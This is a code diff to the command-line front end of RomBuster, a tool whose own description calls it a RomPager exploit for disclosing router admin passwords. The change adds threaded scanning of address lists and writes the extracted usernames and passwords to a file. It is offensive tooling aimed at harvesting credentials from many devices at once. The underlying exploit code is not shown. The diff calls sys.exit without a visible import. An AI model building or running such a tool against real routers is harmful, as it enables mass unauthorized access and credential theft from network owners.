@@ -25,6 +25,7 @@
 #
 
 import argparse
+import threading
 
 from .__main__ import RomBuster
 from .badges import Badges
@@ -33,37 +34,69 @@ from .badges import Badges
 class RomBusterCLI(RomBuster, Badges):
     description = "RomBuster is a RomPager exploitation tool that allows to disclosure network router admin password."
     parser = argparse.ArgumentParser(description=description)
-    parser.add_argument('--list', dest='list', help='Addresses list.')
-    parser.add_argument('--address', dest='address', help='Address.')
+    parser.add_argument('--threads', dest='threads', action='store_true', help='Use threads for fastest work. [best]')
+    parser.add_argument('--output', dest='output', help='Output result to file.')
+    parser.add_argument('--input', dest='input', help='Input file of addresses.')
+    parser.add_argument('--address', dest='address', help='Single address.')
     args = parser.parse_args()
 
     def hack(self, host):
-        self.print_process(f"({host}) - connecting to device ...")
+        self.print_process(f"({host}) - connecting to device...")
         response = self.connect(host)
 
         if response is not None:
-            self.print_process(f"({host}) - accessing device rom ...")
+            self.print_process(f"({host}) - accessing device rom...")
             creds = self.exploit(response)
 
             if creds is not None:
-                self.print_process(f"({host}) - extracting credentials ...")
+                self.print_process(f"({host}) - extracting credentials...")
                 for username in creds.keys():
-                    self.print_information(f"({host}) - {username}:{creds[username]}")
-            else:
-                self.print_error(f"({host}) - rom access denied!")
-        else:
-            self.print_error(f"({host}) - connection rejected!")
+                    return f"({host}) - {username}:{creds[username]}"
+            self.print_error(f"({host}) - rom access denied!")
+            return None
+        self.print_error(f"({host}) - connection rejected!")
+        return None
 
+    def thread(self, number, host):
+        self.print_process(f"Initializing thread #{str(number)}...")
+        result = self.hack(host)
+        if result:
+            if not self.args.output:
+                self.print_success(result)
+            else:
+                with open(self.args.output, 'a') as f:
+                    f.write(f"{result}\n")
+        self.print_information(f"Thread #{str(number)} completed.")
+        
     def start(self):
-        if self.args.list:
-            with open(self.args.list, 'r') as f:
+        if self.args.input:
+            with open(self.args.input, 'r') as f:
                 lines = f.read().strip().split('\n')
+                line_number = 0
                 for line in lines:
-                    self.hack(line)
+                    if not self.args.threads:
+                        result = self.hack(line)
+                        if result:
+                            if not self.args.output:
+                                self.print_success(result)
+                            else:
+                                with open(self.args.output, 'a') as f:
+                                    f.write(f"{result}\n")
+                    else:
+                        process = threading.Thread(target=self.thread, args=[line_number, line])
+                        process.start()
+                    line_number += 1
         elif self.args.address:
-            self.hack(self.args.address)
+            result = self.hack(self.args.address)
+            if result:
+                if not self.args.output:
+                    self.print_success(result)
+                else:
+                    with open(self.args.output, 'a') as f:
+                        f.write(f"{result}\n")
         else:
             self.print_error("No list or address specified!")
+            sys.exit(1)
 
 def main():
     cli = RomBusterCLI()
